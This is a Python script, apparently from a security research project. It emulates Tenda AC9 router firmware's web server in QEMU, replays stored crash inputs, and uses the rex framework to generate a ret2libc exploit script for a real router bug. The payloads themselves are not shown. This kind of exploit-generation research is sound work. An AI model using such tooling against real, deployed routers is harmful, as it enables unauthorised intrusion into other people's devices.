import unittest
import socket
import time
import os
import pathlib
import logging

import rex
import archr
from rex.exploit.actions import (
    RexOpenChannelAction,
    RexSendAction,
    RexCloseChannelAction,
    RexWaitAction,
)
from rex.enums import CrashInputType

from common import qemu_test_path

logging.getLogger("angr.exploration_techniques.tracer").setLevel(logging.DEBUG)
logging.getLogger("rex").setLevel(logging.DEBUG)
logging.getLogger("pyvex.lifting.gym.arm_spotter").setLevel(logging.ERROR)
logging.getLogger("archr.analyzers.qemu_tracer").setLevel(logging.DEBUG)
# logging.getLogger('angrop.gadget_analyzer').setLevel(logging.DEBUG)
logging.getLogger("angrop.chain_builder").setLevel(logging.DEBUG)
logging.getLogger("rex.exploit.techniques.ret2libc").setLevel(logging.DEBUG)
logging.getLogger("archr.target.actions").setLevel(logging.DEBUG)

logging.getLogger("angr.exploration_techniques.tracer").setLevel(logging.DEBUG)
logging.getLogger("rex").setLevel(logging.DEBUG)
logging.getLogger("rex.DumbTracer").setLevel(logging.DEBUG)
logging.getLogger("archr.analyzers.qemu_tracer").setLevel(logging.DEBUG)
logging.getLogger("angrop.chain_builder").setLevel(logging.DEBUG)
logging.getLogger("rex.exploit.techniques.ret2libc").setLevel(logging.DEBUG)
logging.getLogger("archr.target.flight").setLevel(logging.DEBUG)
logging.getLogger("archr.target.actions").setLevel(logging.DEBUG)

qemu_base = pathlib.Path(__file__).absolute()
qemu_base = qemu_base.parent.parent.parent.absolute()
qemu_base = qemu_base / "qtrace"

qemu_plugin_str = [
    f"-plugin",
    f"file={qemu_base / 'qemu_system_plugin' / 'libqtrace.so'}",
]

qemu_base = qemu_base / "qemu" / "build" / "arm-softmmu"
qemu_base = str(qemu_base) + "/qemu-system-"

logging.getLogger("archr.target.qemu_system_target").setLevel(logging.DEBUG)

with open("/data/tenda_cn_ac9_v15/new_pre_fire_input", "rb") as f:
    pre_fire_input = f.read()

with open("/data/tenda_cn_ac9_v15/crash_input", "rb") as f:
    crash_input = f.read()


wait_act0 = RexWaitAction(10)
open_act1 = RexOpenChannelAction()
send_act1 = RexSendAction(pre_fire_input)
wait_act1 = RexWaitAction(10)
close_act = RexCloseChannelAction()
wait_act2 = RexWaitAction(1)
open_act2 = RexOpenChannelAction()
send_act2 = RexSendAction(crash_input)
wait_act3 = RexWaitAction(10)
actions = [
    wait_act0,
    open_act1,
    send_act1,
    wait_act1,
    close_act,
    wait_act2,
    open_act2,
    send_act2,
    wait_act3,
]


with archr.targets.QEMUSystemTarget(
    qemu_test_path("images/zImage"),
    disk_path=qemu_test_path("images/rootfs.qcow2") + ",if=sd,cache=writeback",
    qemu_base=qemu_base,
    arch="arm",
    machine="vexpress-a9",
    dtb=qemu_test_path("images/vexpress-v2p-ca9.dtb"),
    kargs="root=/dev/mmcblk0 console=ttyAMA0,115200",
    plugins=qemu_plugin_str,
    forwarded_ports=[80, 1234],  # HTTP, GDB
    target_path="/bin/httpd",
    target_args=["/bin/httpd"],
    target_env={
        "LD_PRELOAD": "/lib/libnvram-faker.so:/lib/libdl.so.0:/lib/custbind.so"
    },
    login_user=b"root",
).start() as target:

    tracer = archr.targets.QEMUSystemTracerAnalyzer(target)

    crash = rex.Crash(
        target,
        crash=(pre_fire_input, crash_input),
        use_crash_input=True,
        input_type=CrashInputType.TCP,
        trace_mode="dumb",
        tracer_opts={"tracer_bow": tracer},
        aslr=False,
        actions=actions,
    )

    # generate exploits
    factory = crash.exploit(cmd=b"ls -la")
    print(factory.arsenal)
    exp = factory.arsenal["ret2libc"]
    exp._concretize_input()
    exp.script("test_exploit.py")
    print("Done! Horay!")
    print("The exploit is saved as 'exploit.py'")

    #
    # result = tracer.fire(
    #     testcase=[pre_fire_input, crash_input],
    #     channel="tcp:0",
    #     save_core=True,
    #     trace_bb_addr=0x1C518,
    # )

    # print(f"Trace length: {len(result.trace)}")
    # print(f"Core Path: {result.core_path}")
